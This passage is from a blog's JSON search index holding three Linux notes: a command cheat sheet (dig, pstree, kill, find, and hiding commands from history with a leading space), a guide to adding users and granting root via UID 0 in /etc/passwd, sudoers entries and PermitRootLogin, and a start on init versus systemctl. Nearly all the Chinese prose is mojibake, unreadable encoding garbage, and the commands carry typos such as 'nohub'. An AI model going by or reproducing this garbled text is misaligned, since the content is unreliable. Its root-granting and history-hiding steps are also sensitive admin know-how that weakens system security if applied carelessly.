‘çŠ¶ç»“æ„ã€‚ 1234$ pstree | grep php|-+&#x3D; 01365 boo nginx: master process &#x2F;usr&#x2F;local&#x2F;opt&#x2F;nginx&#x2F;bin&#x2F;nginx -g daemon off; | \\--- 01410 boo nginx: worker process | | \\--- 73098 boo grep --color&#x3D;auto nginx digè¿™ä¸ªå‘½ä»¤ç‰¹åˆ«å®ç”¨ï¼Œå¯ä»¥ç”¨æ¥æŸ¥çœ‹åŸŸåè§£ææƒ…å†µã€‚ 123456789101112131415dig 0x2BeAce.com +nostats +nocomments +nocmd; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; 0x2BeAce.com +nostats +nocomments +nocmd;; global options: +cmd;0x2BeAce.com. IN A0x2BeAce.com. 3581 IN A 185.199.108.1530x2BeAce.com. 3581 IN A 185.199.110.1530x2BeAce.com. 3581 IN A 185.199.111.1530x2BeAce.com. 3581 IN A 185.199.109.1530x2BeAce.com. 3581 IN NS ns12.domaincontrol.com.0x2BeAce.com. 3581 IN NS ns11.domaincontrol.com.ns12.domaincontrol.com. 59833 IN A 173.201.73.6ns11.domaincontrol.com. 92984 IN A 97.74.105.6ns12.domaincontrol.com. 146699 IN AAAA 2603:5:2290::6ns11.domaincontrol.com. 92042 IN AAAA 2603:5:2190::6 &lt;ç©ºæ ¼&gt; å‘½ä»¤è¿™æ˜¯ä¸€ä¸ªæœ‰è¶£çš„å‘½ä»¤ï¼Œæ€»æ‰€å‘¨çŸ¥ï¼Œç”¨æˆ·åœ¨ç»ˆç«¯ä¸Šé”®å…¥çš„æ¯ä¸€ä¸ªå‘½ä»¤éƒ½ä¼šè¢«è®°å½•åˆ°historyä¸­ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰ä¸€ä¸ªå‘½ä»¤å¯ä»¥éª—è¿‡historyï¼Œè€Œä¸è¢«è®°å…¥å‘¢ï¼Ÿç­”æ¡ˆæ˜¯æœ‰çš„ã€‚ åœ¨ç»ˆç«¯ï¼Œåªéœ€è¦åœ¨é”®å…¥å‘½ä»¤ä¹‹å‰è¾“å…¥ä¸€ä¸ªæˆ–å¤šä¸ªç©ºæ ¼ï¼Œè¿™æ ·ä½ çš„å‘½ä»¤å°±ä¸ä¼šè¢«è®°å½•äº†ã€‚ 123456$ hisotry8874 pstree | grep nginx$ date2020å¹´ 5æœˆ18æ—¥ æ˜ŸæœŸä¸€ 21æ—¶09åˆ†03ç§’ CST$ history8874 pstree | grep nginx ä¸€äº›å…¶ä»–å‘½ä»¤æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ 1$ uname -a æŸ¥æ‰¾å‘è¡Œç‰ˆä¿¡æ¯ 1$ lsb_release -a æŸ¥çœ‹å½“å‰æ—¥æœŸ 1$ date ç«‹å³å…³æœº 1$ shutdown -h now é‡æ–°å¯åŠ¨ 1$ reboot è¾“å‡ºæ–‡ä»¶ç±»å‹ä¿¡æ¯ 12$ file test.txttest.txt: ASCII text åœ¨ç»ˆç«¯ä¸­è¿›è¡Œç®€å•çš„ç®—æ•°è¿ç®— 12$ expr 1 + 34 é‡å‘½åæ–‡ä»¶ 123$ mv fileA.txt fileB.txt$ lsfileB.txt nohup æ˜¯ä¸€ä¸ª POSIX å‘½ä»¤ï¼Œç”¨äºå¿½ç•¥ SIGHUP ã€‚ SIGHUPä¿¡å·æ˜¯çµ‚ç«¯æ³¨é”€æ—¶æ‰€å‘é€è‡³ç¨‹åºçš„ä¸€ä¸ªä¿¡å·ã€‚ 1nohub php script.php type å‘½ä»¤ç”¨æ¥æ˜¾ç¤ºæŒ‡å®šå‘½ä»¤çš„ç±»å‹ï¼Œåˆ¤æ–­ç»™å‡ºçš„æŒ‡ä»¤æ˜¯å†…éƒ¨æŒ‡ä»¤è¿˜æ˜¯å¤–éƒ¨æŒ‡ä»¤ã€‚ 123type -a phpphp is &#x2F;usr&#x2F;local&#x2F;bin&#x2F;phpphp is &#x2F;usr&#x2F;bin&#x2F;php å‘½ä»¤ç±»å‹ï¼š aliasï¼šåˆ«åã€‚ keywordï¼šå…³é”®å­—ï¼ŒShellä¿ç•™å­—ã€‚ functionï¼šå‡½æ•°ï¼ŒShellå‡½æ•°ã€‚ builtinï¼šå†…å»ºå‘½ä»¤ï¼ŒShellå†…å»ºå‘½ä»¤ã€‚ fileï¼šæ–‡ä»¶ï¼Œç£ç›˜æ–‡ä»¶ï¼Œå¤–éƒ¨å‘½ä»¤ã€‚ unfoundï¼šæ²¡æœ‰æ‰¾åˆ°ã€‚ æŸ¥æ‰¾è¿›ç¨‹ 1ps -aux | grep php æ³¨æ„ï¼šæ¯ä¸ªæ“ä½œç³»ç»Ÿçš„psç‰ˆæœ¬ç•¥æœ‰ä¸åŒï¼ŒUbuntu å’ŒMac ä¸Šå¯ä»¥ç›´æ¥ä½¿ç”¨-auxå‚æ•°ï¼Œä½†å¯èƒ½å…¶ä»–ç³»ç»Ÿä¸èƒ½åŠ ç ´æŠ˜å·ã€‚å‚è€ƒé“¾æ¥ï¼šLinux ps command help and example æ€æ­»è¿›ç¨‹ æ ¹æ® pidï¼ˆä¼šæ€æ­»æŒ‡å®špid çš„è¿›ç¨‹ï¼‰ 1kill -9 [pid] æ ¹æ®è¿›ç¨‹åç§°ï¼ˆä¼šæ€æ­»ä¸€ç»„åŒåè¿›ç¨‹ï¼‰ 1killall php å…¨å±€æ ¹æ®æ–‡ä»¶åæŸ¥æ‰¾æ–‡ä»¶å…·ä½“è·¯å¾„æœ‰æ—¶å€™å¾ˆæƒ³æ‰¾åˆ°æŸä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯åˆä¸è®°å¾—å…·ä½“è·¯å¾„äº†ï¼Œè¿™æ—¶å¯ä»¥ä½¿ç”¨ find å‘½ä»¤ï¼š 1find &#x2F; -name &lt;file name&gt; å‚è€ƒé“¾æ¥ é²œä¸ºäººçŸ¥è€Œåˆå®ç”¨çš„ Linux å‘½ä»¤","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"å‘½ä»¤æ•´ç†","slug":"Linux/å‘½ä»¤æ•´ç†","permalink":"https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Linux æ·»åŠ ç”¨æˆ·ä»¥åŠæƒé™åˆ†é…","slug":"linux-add-users-and-assign-permissions","date":"2020-07-15T15:19:14.000Z","updated":"2020-07-16T15:29:23.772Z","comments":true,"path":"linux-add-users-and-assign-permissions/","link":"","permalink":"https://www.0x2beace.com/linux-add-users-and-assign-permissions/","excerpt":"å†™è¿™ç¯‡ç¬”è®°çš„ç›®çš„æ˜¯ï¼šåœ¨ Linux ä¸‹ç»å¸¸ä¸ºç”¨æˆ·çš„æƒé™é—®é¢˜è€Œå¤´ç–¼ï¼Œè¦ä¹ˆæ˜¯æƒé™ä¸è¶³ï¼Œè¦ä¹ˆæ˜¯æƒé™å¤ªå¤§ï¼Œå¯¼è‡´ç»“æœå¾€å¾€ä¸æ˜¯è‡ªå·±æƒ³è¦çš„ã€‚ å¦å¤–è¿˜æœ‰ä¸€ä¸ªä¿ƒä½¿æˆ‘å†™è¿™ç¯‡ç¬”è®°çš„åŸå› å°±æ˜¯ï¼šä¹‹å‰åœ¨ æœ¬åœ°çš„ Ubuntu ä¸Šï¼Œç«Ÿç„¶æŠŠç”¨æˆ·ç©åäº†â€¦ ä¸ºäº†é¿å…è¿™ç§äº‹æƒ…åœ¨æœåŠ¡å™¨ä¸Šå‘ç”Ÿï¼Œè¿˜æ˜¯å¾—æ·±å…¥ç ”ç©¶ä¸‹è¿™ä¸€å—ã€‚","text":"å†™è¿™ç¯‡ç¬”è®°çš„ç›®çš„æ˜¯ï¼šåœ¨ Linux ä¸‹ç»å¸¸ä¸ºç”¨æˆ·çš„æƒé™é—®é¢˜è€Œå¤´ç–¼ï¼Œè¦ä¹ˆæ˜¯æƒé™ä¸è¶³ï¼Œè¦ä¹ˆæ˜¯æƒé™å¤ªå¤§ï¼Œå¯¼è‡´ç»“æœå¾€å¾€ä¸æ˜¯è‡ªå·±æƒ³è¦çš„ã€‚ å¦å¤–è¿˜æœ‰ä¸€ä¸ªä¿ƒä½¿æˆ‘å†™è¿™ç¯‡ç¬”è®°çš„åŸå› å°±æ˜¯ï¼šä¹‹å‰åœ¨ æœ¬åœ°çš„ Ubuntu ä¸Šï¼Œç«Ÿç„¶æŠŠç”¨æˆ·ç©åäº†â€¦ ä¸ºäº†é¿å…è¿™ç§äº‹æƒ…åœ¨æœåŠ¡å™¨ä¸Šå‘ç”Ÿï¼Œè¿˜æ˜¯å¾—æ·±å…¥ç ”ç©¶ä¸‹è¿™ä¸€å—ã€‚ æ·»åŠ ç”¨æˆ·åœ¨ Linux ä¸Šï¼Œæ·»åŠ ç”¨æˆ·æœ‰ä¸¤ç§æ–¹å¼ï¼šuseraddå’Œadduserï¼Œå…¶åŒºåˆ«å°±æ˜¯ï¼š useradd æ˜¯ä¸€ä¸ªLinux å‘½ä»¤ï¼Œå®ƒæä¾›å¾ˆå¤šå‚æ•°ç»™ç”¨æˆ·æ ¹æ®è‡ªå·±çš„éœ€è¦è¿›è¡Œè®¾ç½®ã€‚ adduser åˆ™æ˜¯ä¸€ä¸ªperl è„šæœ¬ï¼Œåœ¨ä½¿ç”¨æ—¶é€šè¿‡ç®€å•çš„äººæœºäº¤äº’ç•Œé¢ï¼Œä¾›ç”¨æˆ·è¿›è¡Œä¸ªæ€§è®¾ç½®ã€‚ adduserç›¸æ¯” useraddï¼Œadduserçš„ä½¿ç”¨è¦ç®€å•å¾ˆå¤šã€‚ ä½¿ç”¨adduser æ·»åŠ ä¸€ä¸ªç”¨æˆ·ï¼š 1$ adduser boo ç„¶åæ ¹æ®æç¤ºå¡«å†™ç›¸åº”çš„å†…å®¹ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¯¥å‘½ä»¤ä¼šè‡ªåŠ¨çš„åœ¨ /home ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªä¸ç”¨æˆ·åŒåçš„ç›®å½•ã€‚ ç”¨ adduser è¿™ä¸ªå‘½ä»¤åˆ›å»ºçš„è´¦å·æ˜¯ç³»ç»Ÿè´¦å·ï¼Œå¯ä»¥ç”¨æ¥ç™»å½•åˆ° ubuntuç³»ç»Ÿã€‚ useradduseradd å‘½ä»¤æœ‰å¤§é‡çš„å‚æ•°ä¾›æˆ‘ä»¬è¿›è¡Œä¸ªæ€§è®¾ç½®ï¼Œå¸¸ç”¨å‚æ•°å¦‚ä¸‹ï¼š -d&lt;ç™»å…¥ç›®å½•&gt;ï¼šæŒ‡å®šç”¨æˆ·ç™»å…¥æ—¶çš„å¯å§‹ç›®å½•ï¼Œå¹¶èµ‹äºˆç”¨æˆ·å¯¹è¯¥ç›®å½•çš„çš„å®Œå…¨æ§åˆ¶æƒ\u001c -g&lt;ç¾¤ç»„&gt;ï¼šæŒ‡å®šç”¨æˆ·æ‰€å±çš„ç¾¤ç»„ï¼› -G&lt;ç¾¤ç»„&gt;ï¼šæŒ‡å®šç”¨æˆ·æ‰€å±çš„é™„åŠ ç¾¤ç»„ï¼› -mï¼šåœ¨ /home ç›®å½•ä¸‹è‡ªåŠ¨å»ºç«‹ç”¨æˆ·çš„ç™»å…¥ç›®å½•ï¼› -rï¼šå»ºç«‹ç³»ç»Ÿå¸å·ï¼› -sï¼šæŒ‡å®šç”¨æˆ·ç™»å…¥åæ‰€ä½¿ç”¨çš„shellï¼› -uï¼šæŒ‡å®šç”¨æˆ·çš„ id ä½¿ç”¨ useradd åˆ›å»ºç”¨æˆ·çš„ä¸€èˆ¬æ­¥éª¤å¦‚ä¸‹ï¼š 1234$ useradd -m boo -s &#x2F;bin&#x2F;bash$ passwd boo$ ls &#x2F;home&#x2F;boo å…¶ä¸­è¦æ³¨æ„çš„æœ‰ï¼š useradd å‘½ä»¤å¦‚æœä¸å¸¦ä»»ä½•å‚æ•°ï¼ˆuseradd booï¼‰ï¼Œè¡¨ç¤ºåªæ˜¯åˆ›å»ºä¸€ä¸ªç”¨æˆ·ï¼Œæ—¢æ²¡æœ‰ /home ç›®å½•ä¸‹çš„åŒåæ–‡ä»¶å¤¹ï¼Œä¹Ÿæ²¡æœ‰è®¾ç½®å¯†ç ï¼Œä½†æ˜¯å¯ä»¥åœ¨ /etc/passwd æ–‡ä»¶çš„æœ€åä¸€è¡Œçœ‹åˆ°åˆšæ‰æ·»åŠ çš„ç”¨æˆ·ã€‚ useradd è¿™ä¸ªå‘½ä»¤åˆ›å»ºçš„æ˜¯æ™®é€šè´¦å·ï¼Œå¹¶ä¸èƒ½ç”¨æ¥ç™»å½•ç³»ç»Ÿã€‚åŠ ä¸Šå‚æ•°-rï¼Œå°†è¯¥ç”¨æˆ·åŠ å…¥åˆ°ç³»ç»Ÿç”¨æˆ·ï¼Œç³»ç»Ÿç”¨æˆ·ä¸º idåœ¨ 1000ä»¥ä¸‹çš„ç”¨æˆ·ï¼Œè€Œæ™®é€šç”¨æˆ·åˆ™æ˜¯id åœ¨ 1000ä»¥ä¸Šã€‚äº‹å®è¯æ˜ æ— è®ºæ˜¯æ™®é€šç”¨æˆ·è¿˜æ˜¯ç³»ç»Ÿç”¨æˆ· åªè¦å¯†ç è¾“å…¥æ­£ç¡®éƒ½èƒ½ç™»å…¥ç³»ç»Ÿã€‚ å½“ä½¿ç”¨å‚æ•°-mçš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨åœ°åœ¨ /home ç›®å½•ä¸‹å»ºç«‹ä¸€ä¸ªä¸æ–°å»ºç”¨æˆ·åŒåçš„ç”¨æˆ·ä¸»æ–‡ä»¶å¤¹ï¼›å¦‚æœä¸ä½¿ç”¨-mçš„è¯ï¼Œé‚£ä¹ˆå°±é»˜è®¤æ˜¯ä½¿ç”¨-Må‚æ•°ï¼Œä¸åˆ›å»ºä¸»æ–‡ä»¶å¤¹ï¼Œå³ä½¿ä½ ä½¿ç”¨äº†-dè¿™ä¸ªå‚æ•°ã€‚æ‰€ä»¥å¦‚æœæƒ³è¦è‡ªå·±é€‰æ‹©ä¸»æ–‡ä»¶å¤¹ï¼Œéœ€è¦åŒæ—¶åŠ ä¸Š-må’Œ-då‚æ•°ã€‚ è¯¯åŒºï¼šå¾ˆéƒ½æ—¶å€™åˆšæ‹¿åˆ°ä¸€å°æ–°çš„æœºå™¨ï¼Œä¼šå‘ç°ç”¨æˆ·ç›®å½•ä¸‹åªæœ‰ä¸€ä¸ªå½“å‰ç”¨æˆ·çš„æ–‡ä»¶å¤¹ï¼Œä¸è¦è¯¯ä»¥ä¸ºè¯¥ç³»ç»Ÿåªæœ‰ä½ ä¸€ä¸ªç”¨æˆ·ï¼Œæ˜¯å› ä¸ºå¾ˆå¤šç³»ç»Ÿç”¨æˆ·çš„ä¸»ç›®å½•å¹¶ä¸åœ¨ /home ä¸‹ã€‚ æƒé™åˆ†é…ææƒæ— è®ºæ˜¯ä½¿ç”¨ adduser è¿˜æ˜¯ useradd åˆ›å»ºçš„ç”¨æˆ·ï¼Œéƒ½è¯•ç€æ‰§è¡Œä¸€ä¸‹ä»¥ä¸‹å‘½ä»¤ï¼š 1$ sudo apt-get install vim ä¸å‡ºæ„å¤–ï¼Œä½ è‚¯å®šä¼šå¾—åˆ°è¿™æ ·ä¸€ä¸ªé”™è¯¯ï¼š 12[sudo] password for boo:boo is not in the sudoers file. This incident will be reported. è¿™ä¸ªé”™è¯¯çš„æ„æ€æ˜¯è¯´è¯¥ç”¨æˆ·å¹¶ä¸åœ¨ sudoers æ–‡ä»¶ä¸­ï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•è§£å†³å‘¢ï¼Ÿ ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š 1234567$ sudo visudo# Members of the admin group may gain root privileges%admin ALL&#x3D;(ALL) ALL# æ‰¾åˆ°è¯¥æ³¨é‡Šï¼Œåœ¨å…¶ä¸‹å¢åŠ ä¸€è¡Œ %yourusername ALL&#x3D;(ALL) ALL ç„¶åä¿å­˜é€€å‡ºï¼Œå°±ä¼šå‘ç°å¯ä»¥ä½¿ç”¨ sudo ææƒäº†ã€‚ èµ‹äºˆ root æƒé™è¿™é‡Œæœ‰ä¸‰ç§æ–¹å¼ï¼Œå…ˆæ¥çœ‹çœ‹æœ€ç®€å•çš„æ–¹å¼ï¼š æ–¹å¼ä¸€ï¼š 1234$ sudo vim &#x2F;etc&#x2F;passwd# å°†ç”¨æˆ·id æ”¹ä¸º 0testuser1:x:0:1001::&#x2F;home&#x2F;testuser1:&#x2F;bin&#x2F;sh éœ€è¦æ³¨æ„çš„æ˜¯ï¼š è¯¥æ–¹æ³•é€‚ç”¨äºæ™®é€šç”¨æˆ·ä»¥åŠç®¡ç†å‘˜ç”¨æˆ· ä½¿ç”¨ testuser1 è´¦æˆ·ç™»å½•åï¼Œç›´æ¥è·å–çš„å°±æ˜¯ root å¸å·çš„æƒé™ã€‚ æ–¹å¼äºŒï¼šï¼ˆè¿™é‡Œä»¥ubuntu ç³»ç»Ÿä¸ºä¾‹ï¼‰ 1234567$ sudo visudo # sudo vim &#x2F;etc&#x2F;sudoers# Allow members of group sudo to execute any command%sudo ALL&#x3D;(ALL:ALL) ALL# åœ¨å…¶åé¢å¢åŠ ä¸€è¡Œ%wheel ALL&#x3D;(ALL:ALL) ALL ç„¶åä¿®æ”¹è¯¥ç”¨æˆ·ï¼Œä½¿å…¶å±äº root ç»„ï¼ˆwheelï¼‰ï¼š 1$ usermod -g root boo ä¿®æ”¹å®Œæˆä¹‹åï¼Œä½¿ç”¨boo ç”¨æˆ·ç™»å…¥ï¼Œæ‰§è¡Œå‘½ä»¤ï¼šsu -ï¼Œè¾“å…¥ root è´¦æˆ·çš„å¯†ç ï¼Œå³å¯è·å¾—root æƒé™ã€‚ æ–¹å¼ä¸‰ï¼šï¼ˆè¿™é‡Œä»¥ubuntu ä¸ºä¾‹ï¼‰ 12345$ sudo visudo # sudo vim &#x2F;etc&#x2F;sudoers# User privilege specificationroot ALL&#x3D;(ALL:ALL) ALLboo ALL&#x3D;(ALL:ALL) ALL ä¿®æ”¹å®Œæˆä¹‹åï¼Œä½¿ç”¨boo ç”¨æˆ·ç™»å…¥ï¼Œæ‰§è¡Œå‘½ä»¤ï¼šsu -ï¼Œè¾“å…¥ root è´¦æˆ·çš„å¯†ç ï¼Œå³å¯è·å¾—root æƒé™ã€‚ æ–¹å¼äºŒã€æ–¹å¼ä¸‰å’Œæ–¹å¼ä¸€çš„åŒºåˆ«å°±æ˜¯ï¼šå‰è€…éœ€è¦çŸ¥é“root è´¦æˆ·çš„å¯†ç ï¼Œè€Œåè€…å¯ä»¥ç›´æ¥ä»¥æ™®é€šç”¨æˆ·çš„èº«ä»½æˆ–è€…ç®¡ç†å‘˜èº«ä»½è·å–root æƒé™ã€‚ å¦å¤–è¿˜æœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹å°±æ˜¯ï¼šä½¿ç”¨ç¬¬ä¸€ç§æ–¹å¼è·å– root æƒé™ï¼Œå…¶å®ä¹Ÿæœ‰å¼Šç«¯ï¼Œå¼Šç«¯å°±æ˜¯ è¿œç¨‹ä½¿ç”¨è¯¥ç”¨æˆ·ç™»å…¥æ—¶ï¼Œè¿˜æ˜¯éœ€è¦è¾“å…¥ root å¯†ç ï¼Œæ‰èƒ½éªŒè¯èº«ä»½æˆåŠŸï¼Œæ˜¯çš„ å¿…é¡»è¾“å…¥ root ç”¨æˆ·çš„å¯†ç ã€‚ äº‹å®è¯æ˜ï¼Œå¹¶éä¸Šé¢æ‰€è¿°ï¼Œssh è¿æ¥æ—¶çš„ç¡®éœ€è¦è¾“å…¥å¯†ç éªŒè¯ï¼Œä½†ä¸æ˜¯ root ç”¨æˆ·çš„å¯†ç ï¼Œä¹‹å‰ä¹‹æ‰€ä»¥ä¸€ç›´çœ‹åˆ° Permission denied, please try again.è¿™æ ·çš„é”™è¯¯ï¼Œåªæ˜¯å› ä¸º æ²¡æœ‰å¼€å¯å…è®¸ root ç”¨æˆ·è¿œç¨‹ç™»å…¥çš„æƒé™ã€‚å¦‚ä½•å¼€å¯ï¼Œè§ä¸‹æ–‡æ‰©å±•è¡¥å……ã€‚ æ‰©å±•è¡¥å……åœ¨Ubuntuä¸­å¦‚ä½•ä¿®æ”¹ root å¯†ç é»˜è®¤æƒ…å†µä¸‹ï¼Œå‡ºäºå®‰å…¨åŸå› ï¼Œrootç”¨æˆ·å¸æˆ·å¯†ç åœ¨Ubuntu Linux ä¸­è¢«é”å®šã€‚å› æ­¤ï¼Œæ— æ³•ä½¿ç”¨rootç”¨æˆ·ç™»å½•æˆ–ä½¿ç”¨è¯¸å¦‚su -ä¹‹ç±»çš„å‘½ä»¤æˆä¸ºè¶…çº§ç”¨æˆ·ã€‚ ä½†å¯ä»¥å€ŸåŠ©å…¶ä»–æ–¹å¼ï¼Œä½¿ç”¨passwdå‘½ä»¤æ¥ä¿®æ”¹ã€‚å› ä¸ºæ™®é€šç”¨æˆ·åªèƒ½æ›´æ”¹å…¶å¸æˆ·çš„å¯†ç ã€‚è¶…çº§ç”¨æˆ·ï¼ˆrootï¼‰å¯ä»¥æ›´æ”¹ä»»ä½•ç”¨æˆ·å¸æˆ·çš„å¯†ç ï¼ˆåŒ…æ‹¬å®ƒè‡ªå·±ï¼‰ã€‚ ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æˆä¸º rootç”¨æˆ·ï¼š 12$ sudo -i$ passwd root å¦‚æœåœ¨sudo å‘½ä»¤ä½¿ç”¨ä¸äº†çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥è¿›å…¥å•ç”¨æˆ·æ¨¡å¼ï¼Œå†è¿›è¡Œä¿®æ”¹ 1$ passwd root åœ¨Ubuntuä¸­å¦‚ä½•è¿œç¨‹ root ç™»å…¥åœ¨Ubuntuä¸­ï¼Œé»˜è®¤æ˜¯ä¸èƒ½ä½¿ç”¨ root è´¦æˆ·ç™»å…¥åˆ°ç³»ç»Ÿçš„ï¼Œå¦‚æœä¸€å®šæƒ³è¦ç”¨ rootè´¦æˆ·ç™»å…¥ï¼Œå¯ä»¥ç¼–è¾‘ sshd é…ç½®ï¼Œæ‰§è¡Œå¦‚ä¸‹æ“ä½œï¼š 12345678$ sudo vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config# PermitRootLogin prohibit-password# ä¿®æ”¹ä¸ºï¼š# PermitRootLogin yes# é‡å¯sshd æœåŠ¡$ sudo systemctl restart sshd å‚è€ƒé“¾æ¥ adduser å’Œ useradd çš„åŒºåˆ« Ubuntu å¦‚ä½•è¿›å…¥å•ç”¨æˆ·æ¨¡å¼ ssh-å¦‚ä½•è¿œç¨‹ä»¥root ç™»å…¥ å¦‚ä½•åœ¨Ubuntu Linux ä¸­æ›´æ”¹ root å¯†ç  å¦‚ä½•ä½¿ç”¨su / sudoæˆä¸ºUbuntu Linuxçš„è¶…çº§ç”¨æˆ·ï¼Ÿ Ubuntu Linux root ç”¨æˆ·é»˜è®¤å¯†ç ","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"Linux/å­¦ä¹ ç¬”è®°","permalink":"https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Linux initã€serviceã€systemctl ä¸‰è€…åŒºåˆ«","slug":"the-difference-between-linux-init-service-systemctl","date":"2020-07-14T15:38:00.000Z","updated":"2020-12-12T05:46:24.839Z","comments":true,"path":"the-difference-between-linux-init-service-systemctl/","link":"","permalink":"https://www.0x2beace.com/the-difference-between-linux-init-service-systemctl/","excerpt":"åœ¨æ¥è§¦åˆ°Linux çš„æœåŠ¡ä¹‹åï¼Œæˆ‘æ‰€çŸ¥é“çš„ç®¡ç†æœåŠ¡çš„æ–¹å¼æœ‰ä¸‰ç§ï¼Œåˆ†åˆ«æ˜¯initã€serviceã€systemctlã€‚ è‡³äºè¿™ä¸‰è€…ä¹‹é—´çš„åŒºåˆ«ä¸å¾—è€ŒçŸ¥ï¼Œæ‰€ä»¥æ•´ç†è¿™ç‰‡ç¬”è®°çš„ç›®çš„å°±æ˜¯äº†è§£è¿™ä¸‰è€…ä¹‹é—´çš„åŒºåˆ«ã€‚","text":"åœ¨æ¥è§¦åˆ°Linux çš„æœåŠ¡ä¹‹åï¼Œæˆ‘æ‰€çŸ¥é“çš„ç®¡ç†æœåŠ¡çš„æ–¹å¼æœ‰ä¸‰ç§ï¼Œåˆ†åˆ«æ˜¯initã€serviceã€systemctlã€‚ è‡³äºè¿™ä¸‰è€…ä¹‹é—´çš„åŒºåˆ«ä¸å¾—è€ŒçŸ¥ï¼Œæ‰€ä»¥æ•´ç†è¿™ç‰‡ç¬”è®°çš„ç›®çš„å°±æ˜¯äº†è§£è¿™ä¸‰è€…ä¹‹é—´çš„åŒºåˆ«ã€‚ initå†å²ä¸Šï¼ŒLinux çš„å¯åŠ¨ä¸€ç›´é‡‡ç”¨init è¿›ç¨‹ã€‚ åœ¨ç±»Unix çš„è®¡ç®—æœºæ“ä½œç³»ç»Ÿä¸­ï¼ŒInitï¼ˆåˆå§‹åŒ–çš„ç®€ç§°ï¼‰æ˜¯åœ¨å¯åŠ¨è®¡ç®—æœºç³»ç»ŸæœŸé—´å¯åŠ¨çš„ç¬¬ä¸€ä¸ªè¿›ç¨‹ã€‚ Init æ˜¯ä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹ï¼Œå®ƒå°†æŒç»­è¿è¡Œï¼Œç›´åˆ°ç³»ç»Ÿå…³é—­ã€‚å®ƒæ˜¯æ‰€æœ‰å…¶ä»–è¿›ç¨‹çš„ç›´æ¥æˆ–é—´æ¥çš„çˆ¶è¿›ç¨‹ã€‚ å› ä¸ºinit çš„å‚æ•°å…¨åœ¨/etc/init.dç›®å½•ä¸‹ï¼Œæ‰€ä»¥ä½¿ç”¨ init å¯åŠ¨ä¸€ä¸ªæœåŠ¡ï¼Œåº”è¯¥è¿™æ ·åšï¼š 1$ sudo &#x2F;etc&#x2F;init.d&#x2F;nginx start serviceé€šè¿‡æŸ¥çœ‹man æ‰‹å†Œé¡µå¯ä»¥å¾—çŸ¥ï¼Œserviceæ˜¯ä¸€ä¸ªè¿è¡ŒSystem V initçš„è„šæœ¬å‘½ä»¤ã€‚ é‚£ä¹ˆä»€ä¹ˆæ˜¯ System V init å‘¢ï¼Ÿ ä¹Ÿå°±æ˜¯/etc/init.d ç›®å½•ä¸‹çš„å‚æ•°ã€‚ æ‰€ä»¥åˆ†æå¯çŸ¥service æ˜¯å»/etc/init.dç›®å½•ä¸‹æ‰§è¡Œç›¸å…³ç¨‹åºï¼ŒæœåŠ¡é…ç½®æ–‡ä»¶çš„å­˜æ”¾ç›®å½•å°±æ˜¯/etc/init.d. ä½¿ç”¨ service å¯åŠ¨ä¸€ä¸ªæœåŠ¡ 1$ service nginx start å¯ä»¥ç†è§£æˆ service å°±æ˜¯init.d çš„ä¸€ç§å®ç°æ–¹å¼ã€‚æ‰€ä»¥è¿™ä¸¤è€…å¯åŠ¨æ–¹å¼ï¼ˆæˆ–è€…æ˜¯åœæ­¢ã€é‡å¯ï¼‰å¹¶æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚ 123$ sudo &#x2F;etc&#x2F;init.d&#x2F;nginx start&#x2F;&#x2F; ç­‰ä»·äº$ service nginx start ä½†æ˜¯è¿™ä¸¤ç§æ–¹å¼å‡æœ‰å¦‚ä¸‹ç¼ºç‚¹ï¼š å¯åŠ¨æ—¶é—´é•¿ã€‚init è¿›ç¨‹æ˜¯ä¸²è¡Œå¯åŠ¨ï¼Œåªæœ‰å‰ä¸€ä¸ªè¿›ç¨‹å¯åŠ¨å®Œï¼Œæ‰ä¼šå¯åŠ¨ä¸‹ä¸€ä¸ªè¿›ç¨‹ã€‚ å¯åŠ¨è„šæœ¬å¤æ‚ã€‚initè¿›ç¨‹åªæ˜¯æ‰§è¡Œå¯åŠ¨è„šæœ¬ï¼Œä¸ç®¡å…¶ä»–äº‹æƒ…ã€‚è„šæœ¬éœ€è¦è‡ªå·±å¤„ç†å„ç§æƒ…å†µï¼Œè¿™å¾€å¾€ä½¿å¾—è„šæœ¬å˜å¾—å¾ˆé•¿ã€‚ systemdSystemd å°±æ˜¯ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜è€Œè¯ç”Ÿçš„ã€‚å®ƒåŒ…æ‹¬ System and Service Managerï¼Œä¸ºç³»ç»Ÿçš„å¯åŠ¨å’Œç®¡ç†æä¾›ä¸€å¥—å®Œæ•´çš„è§£å†³æ–¹æ¡ˆã€‚Systemd æ˜¯Linux ç³»ç»Ÿä¸­æœ€æ–°çš„åˆå§‹åŒ–ç³»ç»Ÿï¼ˆinitï¼‰ï¼Œå®ƒä¸»è¦çš„è®¾è®¡ç›®çš„æ˜¯å…‹æœ System V initå›ºæœ‰çš„ç¼ºç‚¹ï¼Œæé«˜ç³»ç»Ÿçš„å¯åŠ¨é€Ÿåº¦ã€‚ æ ¹æ® Linux æƒ¯ä¾‹ï¼Œå­—æ¯dæ˜¯å®ˆæŠ¤è¿›ç¨‹ï¼ˆdaemonï¼‰çš„ç¼©å†™ã€‚ Systemd 